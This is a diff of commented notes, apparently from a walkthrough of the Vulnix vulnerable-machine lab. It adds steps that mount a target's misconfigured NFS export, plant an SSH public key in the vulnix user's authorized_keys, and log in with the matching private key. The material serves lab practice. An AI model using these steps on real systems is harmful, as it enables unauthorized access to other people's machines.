@@ -4,6 +4,9 @@
 Export list for [target ip]:
 /home/vulnix *
 
+#
+# mount -t nfs [target ip]:/ /tmp/r00t/
+#
 
 #
 # /home/vulnix/ *	# permission denied
@@ -26,8 +29,9 @@ Export list for [target ip]:
 # cat /home/vulnix/.ssh/id_rsa.pub > /tmp/r00t/home/vulnix/.ssh/authorized_keys
 
 #
+# Unmount the nfs.
 # umount /tmp/r00t
-#
+
 
 #
 # ssh -i /home/vulnix/.ssh/id_rsa vulnix@[target ip]
